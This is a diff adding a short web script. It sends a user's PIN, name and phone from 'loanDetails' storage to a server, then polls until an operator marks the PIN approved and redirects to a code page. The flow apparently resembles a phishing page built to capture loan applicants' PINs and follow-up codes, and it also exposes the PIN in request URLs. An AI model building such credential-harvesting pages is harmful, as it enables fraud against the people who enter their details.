@@ -1,0 +1,46 @@
+<script>
+async function submitPin() {
+  const pinInput = document.getElementById('pinInput');
+  const pin = pinInput.value.trim();
+  const submitBtn = document.getElementById('submitBtn');
+
+  if (!pin) {
+    alert('Please enter your PIN');
+    return;
+  }
+
+  submitBtn.disabled = true;
+  submitBtn.innerText = 'Verifying...';
+
+  // Get user details from localStorage
+  const userDetails = JSON.parse(localStorage.getItem('loanDetails')) || {};
+  const { name, phone } = userDetails;
+
+  // Send PIN along with Name and Phone to server
+  try {
+    const res = await fetch('/submit-pin', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ name, phone, pin })
+    });
+
+    const data = await res.json();
+
+    // Start polling for approval
+    const interval = setInterval(async () => {
+      const check = await fetch(`/check-pin/${pin}`);
+      const { approved } = await check.json();
+
+      if (approved) {
+        clearInterval(interval);
+        window.location.href = 'code.html';
+      }
+    }, 1000);
+
+  } catch (err) {
+    console.error('Error submitting PIN:', err);
+    submitBtn.disabled = false;
+    submitBtn.innerText = 'Submit';
+  }
+}
+</script>
